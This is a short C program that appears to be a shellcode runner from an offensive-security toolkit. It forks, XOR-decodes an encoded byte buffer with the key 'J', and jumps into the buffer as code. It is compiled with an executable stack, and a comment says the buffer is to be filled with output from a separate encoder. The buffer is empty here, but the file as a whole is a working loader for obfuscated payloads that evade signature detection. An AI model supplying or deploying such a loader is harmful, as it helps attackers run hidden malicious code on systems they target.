#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// gcc -o runnerXOR.elf runnerXOR.c -z execstack
//
// Output from encoder.c
unsigned char buf[] = "";

int main (int argc, char **argv)
{

    if (fork() == 0)
    {
		char xor_key = 'J';
			int arraysize = (int) sizeof(buf);
				for (int i=0; i<arraysize-1; i++)
				{
					buf[i] = buf[i]^xor_key;
				}

				int (*ret)() = (int(*)())buf;
				ret();
		}
		else
		{
			return 0;
		}
}
